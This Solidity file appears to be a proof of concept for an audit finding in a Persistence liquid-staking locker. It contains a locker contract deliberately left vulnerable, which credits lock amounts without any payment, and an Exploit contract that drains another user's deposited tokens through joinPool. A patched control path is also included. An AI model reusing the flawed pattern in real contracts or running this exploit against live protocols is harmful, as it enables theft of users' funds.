// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/* Persistence PRST-5 (AuditVault 53505). CosmWasm lockLstAsset only
   compares coin.amount when info.funds contains the denom. An empty
   funds list skips the check, then LOCK_AMOUNT still increases.
   joinPool later pays that credit out of tokens Alice actually sent.
   The fixed path reverts unless a matching coin was pulled. */

contract Lst {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "bal");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "bal");
        require(allowance[from][msg.sender] >= amount, "allow");
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Locker {
    struct Asset {
        string denom;
        uint256 amount;
    }

    struct Coin {
        string denom;
        uint256 amount;
    }

    Lst public lst;
    bool public requirePaid;
    mapping(address => mapping(bytes32 => uint256)) public lockAmount;

    error InvalidAmount();

    constructor(Lst lst_, bool requirePaid_) {
        lst = lst_;
        requirePaid = requirePaid_;
    }

    function _key(string memory denom) internal pure returns (bytes32) {
        return keccak256(bytes(denom));
    }

    function lockLstAsset(Asset memory asset, Coin[] memory funds) external {
        address user = msg.sender;
        bytes32 key = _key(asset.denom);
        uint256 locked_amount = lockAmount[user][key];
        bool matched = false;
        uint256 n = funds.length;
        for (uint256 i = 0; i < n; i++) {
            if (keccak256(bytes(funds[i].denom)) == key) {
                if (funds[i].amount != asset.amount) {
                    revert InvalidAmount();
                }
                require(lst.transferFrom(user, address(this), asset.amount), "pay");
                matched = true;
            }
        }
        if (requirePaid) {
            if (!matched) revert InvalidAmount();
        }
        // @> VULN: lock credit increases even when funds contained no matching coin
        locked_amount = locked_amount + asset.amount;
        lockAmount[user][key] = locked_amount;
    }

    function joinPool(string memory denom, uint256 amount) external {
        bytes32 key = _key(denom);
        require(lockAmount[msg.sender][key] >= amount, "lock");
        lockAmount[msg.sender][key] -= amount;
        require(lst.transfer(msg.sender, amount), "stake");
    }
}

contract Alice {
    function payAndLock(Lst lst, Locker locker, uint256 amount) external {
        lst.approve(address(locker), amount);
        Locker.Coin[] memory funds = new Locker.Coin[](1);
        funds[0] = Locker.Coin("ux", amount);
        locker.lockLstAsset(Locker.Asset("ux", amount), funds);
    }
}

contract Exploit {
    uint256 public constant N = 100 ether;

    Lst public lst;
    Locker public locker;
    Locker public fixedLocker;
    Alice public alice;
    uint256 public stolen;
    bool public controlReverted;
    uint256 public aliceStillLocked;

    constructor() {
        lst = new Lst();
        locker = new Locker(lst, false);
        fixedLocker = new Locker(lst, true);
        alice = new Alice();
    }

    function run() external {
        lst.mint(address(alice), N);
        alice.payAndLock(lst, locker, N);
        require(lst.balanceOf(address(locker)) == N, "alice paid");
        require(locker.lockAmount(address(alice), keccak256("ux")) == N, "alice lock");
        Locker.Coin[] memory none = new Locker.Coin[](0);
        locker.lockLstAsset(Locker.Asset("ux", N), none);
        require(lst.balanceOf(address(this)) == 0, "bob paid nothing");
        require(locker.lockAmount(address(this), keccak256("ux")) == N, "bob credit");
        locker.joinPool("ux", N);
        stolen = lst.balanceOf(address(this));
        require(stolen == N, "stolen");
        require(lst.balanceOf(address(locker)) == 0, "drained");
        require(locker.lockAmount(address(alice), keccak256("ux")) == N, "alice credit remains");
    }

    function runControl() external {
        lst.mint(address(alice), N);
        alice.payAndLock(lst, fixedLocker, N);
        Locker.Coin[] memory none = new Locker.Coin[](0);
        try fixedLocker.lockLstAsset(Locker.Asset("ux", N), none) {
            controlReverted = false;
        } catch {
            controlReverted = true;
        }
        require(controlReverted, "revert");
        aliceStillLocked = lst.balanceOf(address(fixedLocker));
        require(aliceStillLocked == N, "kept");
        require(lst.balanceOf(address(this)) == 0, "bob");
    }
}
